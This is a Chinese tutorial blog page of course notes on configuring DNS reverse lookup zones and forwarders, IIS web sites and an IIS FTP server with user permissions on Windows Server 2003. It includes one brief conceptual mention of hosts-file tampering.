+<p>在反向区域创建区域文件是为了进行反向解析，在一开始使用<code>nslookup</code>的时候，我们主机去请求DNS服务器解析域名的过程中还会请求DNS服务器返回自己的名字，有时候DNS服务器不知道自己的名字，所以返回Unknown</p>
+<p>有时候家用路由相当于一个DNS服务器，当我们连上路由器的时候，该路由器就是我们的首选DNS服务器，且具有转发器的功能(把不认识的请求转发到公网DNS服务器)，而有时候会返回商家写进去的域名，有时候会返回Unknown(没有给路由器起一个DNS域名)</p>
+<p>下图可以看到在客户机(员工主机)中使用<code>nslookup</code>，DNS服务器的IP地址是公网IP，说明首选DNS服务器是公网里的DNS服务器，并没有用家用路由的DNS服务器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121016775.png" alt="image-20220612101644665"></p>
+<p>而下图可以看到DNS服务器的IP地址是内网IP，所以首选DNS服务器是家用路由器，名字是bogon，应该是个牌子的名字</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121018015.png" alt="image-20220612101820925"></p>
+<p>为了给DNS服务器起一个域名，就需要进行反向解析，就是用自己DNS服务器的IP地址反向解析出自己的域名并发给主机</p>
+<p>首先使用<code>nslookup</code>查看一下是否已经有反向解析</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121020703.png" alt="image-20220612102023595"></p>
+<p>可以看到DNS服务器并不知道自己的名字是多少，所以时间超时返回Unknown</p>
+<p>首先在DNS服务器中起一个正向区域的名字，右键”正向查找区域”–&gt;新建区域，除了区域名称填一个”dns.com”，其它直接下一步并完成</p>
+<p>创建完之后再新建一个A记录，名称比如说”bj”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121022714.png" alt="image-20220612102229619"></p>
+<p>这里的IP地址一定要填的是DNS服务器的IP地址，然后点击”添加主机”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121024125.png" alt="image-20220612102416994"></p>
+<p>创建完成之后就可以看到新建的A记录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121026482.png" alt="image-20220612102620359"></p>
+<p>这时候就要在反向区域里创建一个反向解析的区域文件了，右键”反向查找区域”–&gt;新建区域</p>
+<p>在反向查找区域名称里，网络ID填的是DNS服务器的网段，其它都是默认下一步，并完成</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121030388.png" alt="image-20220612103003249"></p>
+<p>然后新建一个反向指针</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121029440.png" alt="image-20220612102924252"></p>
+<p>主机IP号填写DNS服务器的IP，主机名的话点击浏览，找到刚才创建的正向区域中的A记录，就可以通过主机IP号反向解析出主机名了</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121031383.png" alt="image-20220612103122246"></p>
+<p>然后再在客户机中使用<code>nslookup</code>就可以看到DNS服务器的名字了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121033643.png" alt="image-20220612103346498"></p>
+<h3 id="6）DNS转发器"><a href="#6）DNS转发器" class="headerlink" title="6）DNS转发器"></a>6）DNS转发器</h3><p>假装有两个DNS服务器</p>
+<ul>
+<li>DNS服务器1的IP是10.1.1.1：解析1000phone.com(完整域名可以解析nz.1000phone.com，IP是3.3.3.3)、jd.com(完整域名可以解析<a target="_blank" rel="noopener" href="http://www.jd.com,ip是5.5.5.5/">www.jd.com，IP是5.5.5.5</a>)</li>
+<li>DNS服务器2的IP是10.1.1.3：解析taobao.com(完整域名可以解析<a target="_blank" rel="noopener" href="http://www.taobao.com,ip是6.6.6.6)、qq.com(完整域名可以解析www.qq.com,ip是8.8.8.8)/">www.taobao.com，IP是6.6.6.6)、qq.com(完整域名可以解析www.qq.com，IP是8.8.8.8)</a></li>
+</ul>
+<p>现在目标就是DNS服务器1做一个DNS转发器，解析不了的域名转发给DNS服务器2，先看一下首选DNS服务器1的时候能不能解析qq.com，可以看到解析超时，说明没有转发器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121736083.png" alt="image-20220612173603960"></p>
+<p>在DNS服务器1的界面中，右键服务器–&gt;属性–&gt;转发器，然后在”所选域的转发器的IP地址列表”中填写DNS服务器2的IP：10.1.1.3</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121754398.png" alt="image-20220612175448275"></p>
+<p>这时候再用客户机访问一次<a target="_blank" rel="noopener" href="http://www.qq.com,可以看到访问成功,10.1.1.1找不到www.qq.com的配置文件,就会通过dns转发器去寻求10.1.1.3的dns服务器2来解析/">www.qq.com，可以看到访问成功，10.1.1.1找不到www.qq.com的配置文件，就会通过DNS转发器去寻求10.1.1.3的DNS服务器2来解析</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121755874.png" alt="image-20220612175530782"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121756336.png" alt="image-20220612175625207"></p>
+<p>ps：如果两个DNS服务器的转发器都指向对方，会形成死循环</p>
+<h2 id="6-DNS客户机如何解析"><a href="#6-DNS客户机如何解析" class="headerlink" title="6.DNS客户机如何解析"></a>6.DNS客户机如何解析</h2><ul>
+<li>必须指向DNS服务器</li>
+<li>手工解析域名：<code>nslookup 域名</code> ，也可以只输入<code>nslookup</code>然后回车，就可以进入手工解析的交互式操作，就可以频繁测试多个域名了</li>
+</ul>
+<p>假设员工主机是win xp，在Internet 协议属性中设置DNS服务器为win server 2003的刚搭建好的IP地址10.1.1.1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110258227.png" alt="image-20220611025816109"></p>
+<p>这样的话该主机就会把刚搭建好的DNS服务器当成首选的DNS服务器，用来解析域名了</p>
+<p>手工解析验证一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110259377.png" alt="image-20220611025910088"></p>
+<p>可以看到DNS服务器为10.1.1.1，而域名对应的IP地址为1.1.1.1</p>
+<p>可以查看一下全球仅有的13个根DNS服务器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110305342.png" alt="image-20220611030506174"></p>
+<p>意思就是如果该DNS服务器没有能力解析客户发过来的域名，而且没有设置转发器，则会去寻找根DNS服务器(前提是联网，没有联网就无法找到)帮忙，而如果转发器指向的DNS服务器也没有能力解析，也会去寻找根DNS服务器帮忙</p>
+<h2 id="7-DNS服务器处理域名请求的顺序"><a href="#7-DNS服务器处理域名请求的顺序" class="headerlink" title="7.DNS服务器处理域名请求的顺序"></a>7.DNS服务器处理域名请求的顺序</h2><ul>
+<li>DNS高速缓存(必须学会如何查看及清空)</li>
+<li>DNS区域配置文件(注册域名和IP地址的映射到DNS服务器)</li>
+<li>DNS转发器</li>
+<li>根提示</li>
+</ul>
+<h2 id="8-客户机上清除缓存"><a href="#8-客户机上清除缓存" class="headerlink" title="8.客户机上清除缓存"></a>8.客户机上清除缓存</h2><p><code>ipconfig /flushdns</code></p>
+<p>案例：</p>
+<p>win server 2003中的<a target="_blank" rel="noopener" href="http://www.jd.com的ip地址修改了,从6.6.6.6改成7.7.7.7/">www.jd.com的IP地址修改了，从6.6.6.6改成7.7.7.7</a></p>
+<p>这时候在员工主机中使用<code>ping www.jd.com</code>的操作查看一下IP地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110318705.png" alt="image-20220611031857599"></p>
+<p>发现IP地址还是6.6.6.6，这是因为主机有缓存，ping的话不会再次去请求DNS服务器解析域名了</p>
+<p>而使用命令<code>nslookup www.jd.com</code>可以看到其域名其实是7.7.7.7</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110321126.png" alt="image-20220611032155027"></p>
+<p>因为<code>nslookup</code>命令是唯一不遵循”<strong>先缓存后请求</strong>“原则的，ping或者浏览器访问都会先看本地缓存，<code>nslookup</code>不管怎么样都会直接去请求DNS服务器解析该域名</p>
+<p>而如果DNS服务器更改了域名对应的IP地址该怎么办呢？</p>
+<p><code>ipconfig /flushdns</code>可以清空本地DNS缓存</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110324477.png" alt="image-20220611032436321"></p>
+<p>可以看到ping的时候IP地址变成了最新的7.7.7.7</p>
+<h2 id="9-域名解析记录类型"><a href="#9-域名解析记录类型" class="headerlink" title="9.域名解析记录类型"></a>9.域名解析记录类型</h2><p>A记录：正向解析记录</p>
+<p>CNAME记录：别名</p>
+<p>PTR记录：反向解析记录</p>
+<p>MX：邮件交换记录(知悉即可)</p>
+<h2 id="10-客户机域名请求解析顺序"><a href="#10-客户机域名请求解析顺序" class="headerlink" title="10.客户机域名请求解析顺序"></a>10.客户机域名请求解析顺序</h2><p>1.客户机中的DNS缓存—-2.本地hosts文件–3.找本地DNS服务器</p>
+<p><strong>hosts文件路径：c:\windows\system32\drivers\etc\hosts</strong></p>
+<p><strong>hosts攻击：修改hosts文件的权限之后，就可以修改hosts里的内容了，通过IP地址和域名的映射，使客户机不能正常访问域名</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">映射顺序：</span><br><span class="line">ip 域名</span><br></pre></td></tr></table></figure>
+
+<h2 id="11-服务器对域名请求的处理顺序"><a href="#11-服务器对域名请求的处理顺序" class="headerlink" title="11.服务器对域名请求的处理顺序"></a>11.服务器对域名请求的处理顺序</h2><p>1.服务器中的DNS高速缓存–2.本地区域解析文件–3.转发器–4.根</p>
+<hr>
+<h1 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h1><ul>
+<li><p>web服务器一般也称为:网页服务器、HTTP服务器</p>
+</li>
+<li><p>web服务器是将我们做好的网站通过网络发布出去，让网民通过网络可以远程访问我的网页！比如京东网站服务器、百度web服务器等等</p>
+</li>
+<li><p>web服务器使用的协议是http协议，现在也有https协议了，更加安全</p>
+</li>
+<li><p>HTTP协议端口号：80</p>
+</li>
+<li><p>常用的web中间件(发布web服务器的软件)：</p>
+<ul>
+<li>微软：IIS（IIS软件可以发布web服务器、发布FTP服务器）</li>
+<li>linux：Apache/LAMP/LNMP/Tomcat/Nginx等</li>
+<li>第三方：phpstudy、XAMPP</li>
+</ul>
+</li>
+</ul>
+<h2 id="部署WEB服务器"><a href="#部署WEB服务器" class="headerlink" title="部署WEB服务器"></a>部署WEB服务器</h2><h3 id="1）安装IIS"><a href="#1）安装IIS" class="headerlink" title="1）安装IIS"></a>1）安装IIS</h3><p>在win server 2003中同样安装windows 组件，双击”应用程序服务器”–&gt;双击”Internet 信息服务(IIS)”–&gt;打钩”万维网服务”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130302552.png" alt="image-20220613030259314"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130303505.png" alt="image-20220613030325331"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130303433.png" alt="image-20220613030353284"></p>
+<p>安装完成之后依旧可以在开始菜单中的管理工具看到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130314332.png" alt="image-20220613031403128"></p>
+<p>使用<code>netstat -an</code>查看<strong>80</strong>端口是否已经打开</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130306514.png" alt="image-20220613030621333"></p>
+<h3 id="2）默认网站"><a href="#2）默认网站" class="headerlink" title="2）默认网站"></a>2）默认网站</h3><p>但是此时此刻还没有制作网页，但是IIS自带了一个已经发布好的网站，称之为默认网站，打开IIS管理器–&gt;网站–&gt;默认网站中查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130323152.png" alt="image-20220613032324970"></p>
+<p>该网站的内容是”建设中…”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130309611.png" alt="image-20220613030905508"></p>
+<p>默认网站的路径是c:\Inetpub\wwwroot，当员工访问该IP的网页时，会在该路径下寻找网页</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130328022.png" alt="image-20220613032813758"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130329077.png" alt="image-20220613032945926"></p>
+<p>此时建议停止默认网站，因为默认网站存在巨大漏洞！</p>
+<p>右键”默认网站”–&gt;停止</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130331527.png" alt="image-20220613033112412"></p>
+<p>停止之后，80端口就会自动关闭，因为停止默认网站之后对外已经没有开放任何的网站了，这是IIS的独特之处</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130332830.png" alt="image-20220613033210632"></p>
+<h3 id="3）制作网站1"><a href="#3）制作网站1" class="headerlink" title="3）制作网站1"></a>3）制作网站1</h3><p>制作网站的主要步骤有两个：</p>
+<ul>
+<li>新建网站(发布网站)，在网站右键–&gt;新建网站即可</li>
+<li>设置默认文档，如baidu网站–&gt;右键属性–&gt;文档–&gt;添加首页</li>
+</ul>
+<p>随便在某个盘(不建议在桌面或者是C盘上)，比如E盘新建一个文件夹专门用来存放某种类型(比如baidu)的网站，然后总共有两个站点，一个是baidu.html(当作主站点)，一个是nba.html(当作副站点)，主站点可点击超链接访问副站点(这个超链接是相对路径)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130339077.png" alt="image-20220613033958945"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130340138.png" alt="image-20220613034056048"></p>
+<p>编辑好以后，可以直接双击文件先本地访问主站点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130341812.png" alt="image-20220613034121729"></p>
+<p>点击”NBA”超链接之后跳转到nba.html</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130341702.png" alt="image-20220613034152546"></p>
+<p>检查好以后，新建网站发布</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130342983.png" alt="image-20220613034255874"></p>
+<p>首先输入网站的描述，用来辨识</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130343651.png" alt="image-20220613034343537"></p>
+<p>然后填写IP地址和网站的端口号</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130344881.png" alt="image-20220613034451742"></p>
+<p>然后网站主目录指向刚才新建的装有站点的文件夹</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130345621.png" alt="image-20220613034520442"></p>
+<p>网站访问权限建议只允许”读取”，不要给过多权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130346523.png" alt="image-20220613034610415"></p>
+<p>完成以后，可以看到baidu网站已经创建好了，但是还不能够成功访问内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130350879.png" alt="image-20220613035024758"></p>
+<p>因为还没设置首页，右键”baidu”–&gt;属性</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130347963.png" alt="image-20220613034757781"></p>
+<p>然后选择文档，在默认的内容页中，删除其他的默认页，添加刚才的主站点的名字，即baidu.html</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130348990.png" alt="image-20220613034842844"></p>
+<p>这时候，baidu.html就变成80端口的首页了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206130350130.png" alt="image-20220613035049028"></p>
+<h3 id="4）制作网站2"><a href="#4）制作网站2" class="headerlink" title="4）制作网站2"></a>4）制作网站2</h3><h4 id="不同端口"><a href="#不同端口" class="headerlink" title="不同端口"></a>不同端口</h4><p>假如在E盘新建文件夹”hr”，创建文件hr.html</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131627493.png" alt="image-20220613162722365"></p>
+<p>所以现在有两套不同类型的web网站</p>
+<p>所以需要部署到不同的端口上</p>
+<p>还是一样的步骤</p>
+<ul>
+<li>新建网站(发布网站)，在网站右键–&gt;新建网站即可</li>
+<li>设置默认文档，hr网站–&gt;右键属性–&gt;文档–&gt;添加首页</li>
+</ul>
+<p>在第一步新建网站的过程中，绑定端口号的时候需要修改成除了baidu的80端口的其它端口号，否则再启动该站点的时候会报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131631449.png" alt="image-20220613163142337"></p>
+<p>所以需要修改端口号，也可以创建完成之后右键站点–&gt;属性–&gt;网站，可以修改端口号，这里改成81</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131633946.png" alt="image-20220613163331793"></p>
+<p>这时候再用<code>netstat -an</code>查看端口号，发现81端口也打开了，说明hr站点服务已经启动成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131634407.png" alt="image-20220613163409255"></p>
+<p>在浏览器中访问 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131634650.png" alt="image-20220613163442535"></p>
+<p><strong>PS：但是该方法一般都是专业人士来使用，因为一般用户不会特地去输入端口号。一般都是测试人员来使用不同端口号，比如8080端口号很多人用来放测试网站，来对刚敲好的网站进行测试</strong></p>
+<h4 id="不同域名"><a href="#不同域名" class="headerlink" title="不同域名"></a>不同域名</h4><p>还有一种办法就是使用不同的域名发布不同的网站，这个适合更多的普通用户。右键baidu站点–&gt;属性–&gt;网站–&gt;高级</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131641284.png" alt="image-20220613164144121"></p>
+<p>点击之后出现”高级网站标识”，可以看到IP地址和TCP端口绑定的组合，说明访问”10.1.1.2:80”就可以访问web网站</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131642102.png" alt="image-20220613164244964"></p>
+<p>这时候点击”编辑”按钮，主机头值就是完整的域名，把”<a href="http://www.baidu.com&quot;填进去，以后输入这个域名就会默认访问到&quot;10.1.1.2:80&quot;了">www.baidu.com&quot;填进去，以后输入这个域名就会默认访问到&quot;10.1.1.2:80&quot;了</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131645303.png" alt="image-20220613164524160"></p>
+<p>点击”确定”后就可以看到主机头值被设置了，以后用户访问该网站必须满足这三个条件，<strong>意思就是必须访问域名”<a href="http://www.baidu.com&quot;，然后通过域名解析成&quot;10.1.1.2:80&quot;才可访问到该网站的网页，如果直接跳过域名输入&quot;10.1.1.2:80&quot;是不可访问的">www.baidu.com&quot;，然后通过域名解析成&quot;10.1.1.2:80&quot;才可访问到该网站的网页，如果直接跳过域名输入&quot;10.1.1.2:80&quot;是不可访问的</a></strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131646656.png" alt="image-20220613164620519"></p>
+<p>然后hr站点也设置主机头值，<strong>这时候可以是同一个端口号了</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131656906.png" alt="image-20220613165643757"></p>
+<p>然后访问IP地址是不可以的，只能访问域名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131657906.png" alt="image-20220613165733798"></p>
+<p>而访问域名之前记得 部署好DNS服务器，就可以访问了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131658261.png" alt="image-20220613165809104"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131658935.png" alt="image-20220613165817805"></p>
+<p>这种方法普遍使用，比如说京东，这里使用<code>nslookup www.jd.com</code>来看一下京东的公网IP地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131838384.png" alt="image-20220613183808258"></p>
+<p>然后在浏览器网址栏上输入京东的IP地址，这时候请求会被拒绝，并且地址栏显示我们的环回地址127.0.0.1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131839602.png" alt="image-20220613183925493"></p>
+<p>说明可以用域名访问京东，但是不能用IP地址访问</p>
+<h1 id="网站类型"><a href="#网站类型" class="headerlink" title="网站类型"></a>网站类型</h1><h2 id="1-静态网站"><a href="#1-静态网站" class="headerlink" title="1.静态网站"></a>1.静态网站</h2><p>不能与用户进行互动，即没有交互，最多只有超链接，超链接是静态网站之间的互动。一般扩展名为”.html”或者”.htm”</p>
+<p>只有前台页面，没有后台数据库</p>
+<h2 id="2-动态网站"><a href="#2-动态网站" class="headerlink" title="2.动态网站"></a>2.动态网站</h2><p>可以与客户进行互动，可以输入，登录等，动态网页在html静态页面的基础上内置了动态语言。</p>
+<p>动态语言的作用：连接前台页面与后台数据库</p>
+<p>动态语言：php、asp、jsp、java、python</p>
+<p>而扩展名，如果是php编写的动态网页扩展名为”.php”，以此类推”.asp”、”jsp”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206131937150.png" alt="image-20220613193753019"></p>
+<h3 id="发布动态网站"><a href="#发布动态网站" class="headerlink" title="发布动态网站"></a>发布动态网站</h3><p>如果扩展名为”.asp”则需要启用asp语言</p>
+<p>而asp语言是微软开发的，所以：</p>
+<ul>
+<li><p>如果扩展名为”asp”的页面建议用windows服务器发布网站：IIS+ASP+SQL Server (IIS中间件、ASP动态语言、SQL Server数据库，都是微软自己开发的)</p>
+</li>
+<li><p>而如果扩展名为”php”的页面建议用linux服务器发布网站：Apache+PHP+MYSQL (这个组合其实就是LAMP)</p>
+</li>
+</ul>
+<p>案例：</p>
+<p>有asp类型的网站框架需要发布，文件夹名为”933h”，首先像发布静态网站一样右键网站–&gt;新建–&gt;网站，填写描述和IP地址以及端口号之后选择框架的文件夹</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140102389.png" alt="image-20220614010240196"></p>
+<p> 在”网站访问权限”步骤的时候，允许”读取”、”运行脚本”和”执行”权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140105168.png" alt="image-20220614010522034"></p>
+<p> 完成之后设置默认网站，该框架的默认网站的文件名叫”index.asp”，常用的默认网页就是”index”和”default”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140106936.png" alt="image-20220614010658790"></p>
+<p>应用并确定后，允许asp的web服务扩展，即允许asp语言在别人访问网站时连接后台数据库</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140109893.png" alt="image-20220614010921757"></p>
+<p>然后就可以访问该动态网站了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140111504.png" alt="image-20220614011141384"></p>
+<p>并且可以输入信息提交到数据库中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140112590.png" alt="image-20220614011208431"></p>
+<h1 id="FTP服务器"><a href="#FTP服务器" class="headerlink" title="FTP服务器"></a>FTP服务器</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>File Transfor Protocol === 文件传输服务器</p>
+<p>FTP服务器功能几乎等于445文件共享服务器(SMB)</p>
+<p>一般情况下：</p>
+<ul>
+<li>内部文件共享使用SMB(微软开发)服务器</li>
+<li>对外文件共享使用FTP(全球通用)服务器</li>
+</ul>
+<h2 id="2-FTP协议"><a href="#2-FTP协议" class="headerlink" title="2.FTP协议"></a>2.FTP协议</h2><p>两个端口：20/21</p>
+<p>20端口：数据端口(传输数据)，20端口号默认关闭，在用户上传下载文件的时候打开，上传下载完成后再次关闭</p>
+<p>21端口：控制端口(初步访问)，21端口号会一直打开，让用户进行登录操作和浏览操作</p>
+<p>FTP协议有两种连接模式：</p>
+<ul>
+<li>主动模式</li>
+<li>被动模式</li>
+</ul>
+<h2 id="3-使用IIS部署FTP服务器"><a href="#3-使用IIS部署FTP服务器" class="headerlink" title="3.使用IIS部署FTP服务器"></a>3.使用IIS部署FTP服务器</h2><h3 id="1）安装组件"><a href="#1）安装组件" class="headerlink" title="1）安装组件"></a>1）安装组件</h3><p>在IP为10.1.1.2的win server 2003中安装组件，双击”应用程序服务器”–&gt;双击”Internet 信息服务(IIS)”–&gt;打钩”文件传输协议(FTP)服务”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140132704.png" alt="image-20220614013235484"></p>
+<p>安装完成后，使用<code>netstat -an</code>查看21端口号是否已经打开(记住，20端口号默认不打开，只有在传输数据的时候临时打开)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140134317.png" alt="image-20220614013419060"></p>
+<p>而如果把唯一的FTP站点关闭，21端口也会关闭，这时候就代表win server 2003不再是FTP服务器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140153331.png" alt="image-20220614015330195"></p>
+<h3 id="2）默认FTP站点"><a href="#2）默认FTP站点" class="headerlink" title="2）默认FTP站点"></a>2）默认FTP站点</h3><p>打开IIS服务页面后，可以看到有一个默认FTP站点，和WEB服务一样，默认已经对外发布了该文件夹</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140136395.png" alt="image-20220614013629224"></p>
+<p>因为该默认FTP站点也有漏洞，所以停止该默认FTP站点</p>
+<h3 id="3）新建FTP站点"><a href="#3）新建FTP站点" class="headerlink" title="3）新建FTP站点"></a>3）新建FTP站点</h3><p>然后在E盘下新建一个文件夹”movie”，并放入文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140156175.png" alt="image-20220614015613061"></p>
+<p>然后右键”FTP站点”–&gt;新建–&gt;FTP站点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140156259.png" alt="image-20220614015650149"></p>
+<p>填入描述、IP地址和端口号之后，FTP站点主目录选择刚才新建的文件夹”movie”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140157589.png" alt="image-20220614015754424"></p>
+<p>点击”下一步”，在”FTP站点访问权限”的步骤时，把”读取”和”写入”都勾上</p>
+<p><strong>这时候客户机的权限取决于设置的NTFS的权限，因为用户的最终权限为FTP权限和NTFS权限的交集</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140159211.png" alt="image-20220614015906072"></p>
+<h3 id="4）匿名登录"><a href="#4）匿名登录" class="headerlink" title="4）匿名登录"></a>4）匿名登录</h3><p>为了让客户机访问该文件夹的时候需要弹出弹框提示登录用户名和密码，右键”默认FTP站点”–&gt;属性</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140200440.png" alt="image-20220614020029322"></p>
+<p>选择”安全账户”选项，可以看到”允许匿名连接”已经被勾上了，而且IIS默认创建了一个<strong>匿名账户</strong>：IUSR_计算机名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140201387.png" alt="image-20220614020142237"></p>
+<p>可以右键”我的电脑”–&gt;管理–&gt;本地用户和组–&gt;用户中查看到该匿名账户，这个匿名账户仅有访问的权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140147485.png" alt="image-20220614014712306"></p>
+<p>在客户机访问的过程中，FTP服务器会返回这个匿名账户和密码给客户机，以此来让客户机登录该账户进行FTP的访问，实际上客户机已经输入了密码并且登录到该匿名账户来访问FTP服务器了，所以<strong>访问FTP服务器是必须要账号的</strong></p>
+<p>把”允许匿名连接”的勾去掉并确定</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140201174.png" alt="image-20220614020111003"></p>
+<h3 id="5）创建用户并验证"><a href="#5）创建用户并验证" class="headerlink" title="5）创建用户并验证"></a>5）创建用户并验证</h3><p>然后在win server 2003中新建三个账号</p>
+<ul>
+<li>a用户：只允许下载文件</li>
+<li>b用户：只允许上传文件</li>
+<li>c用户：完全控制权限</li>
+</ul>
+<p>然后设置权限，右键”movie”文件夹–&gt;属性–&gt;高级</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140205148.png" alt="image-20220614020521937"></p>
+<p>取消权限的继承，并且保留以前的权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140206906.png" alt="image-20220614020647726"></p>
+<p>然后除了Administrators组，其他用户与组全部删除，并添加a、b、c用户，而a用户具有读取权限(就是下载权限)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140208966.png" alt="image-20220614020814810"></p>
+<p>b用户允许写入(即上传权限)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140209524.png" alt="image-20220614020900379"></p>
+<p>c用户具有完全控制权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140209310.png" alt="image-20220614020953173"></p>
+<p>这时候点击客户机(这里是windows xp)桌面上的”我的电脑”，在上面的地址栏上输入<code>ftp://10.1.1.2</code>就可以访问该文件夹了</p>
+<p>因为不允许匿名登录，所以需要输入用户名和密码，这里使用a账户登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140211541.png" alt="image-20220614021116388"></p>
+<p>登录成功以后就可以看到刚才在FTP服务器的”movie”文件夹中创建的两个文件了，并且可以拷贝到桌面上</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140212357.png" alt="image-20220614021218200"></p>
+<p>而如果要上传文件或者删除文件，则会报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140212371.png" alt="image-20220614021242248"></p>
+<p>切换到b用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140213362.png" alt="image-20220614021307205"></p>
+<p>输入b用户的账号密码之后，就可以看到刚才在FTP服务器的”movie”文件夹中创建的两个文件了</p>
+<p>可以从桌面上传文件到FTP服务器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140214362.png" alt="image-20220614021443213"></p>
+<p>尝试把文件拖到桌面上(下载)或者删除文件，会报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206140214879.png" alt="image-20220614021411764"></p>
